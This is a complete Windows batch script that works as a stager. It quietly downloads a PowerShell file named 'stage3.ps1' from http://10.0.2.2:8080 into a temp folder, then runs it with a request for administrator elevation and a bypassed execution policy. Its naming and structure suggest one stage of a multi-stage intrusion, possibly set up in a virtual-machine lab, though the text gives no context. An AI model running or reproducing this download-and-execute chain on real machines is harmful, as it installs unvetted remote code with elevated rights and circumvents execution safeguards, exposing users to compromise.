@echo off
set d=%TEMP%\p37vm
mkdir %d% 2>nul
curl -s -o %d%\stage3.ps1 http://10.0.2.2:8080/stage3.ps1
powershell -NoProfile -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','%d%\stage3.ps1'"
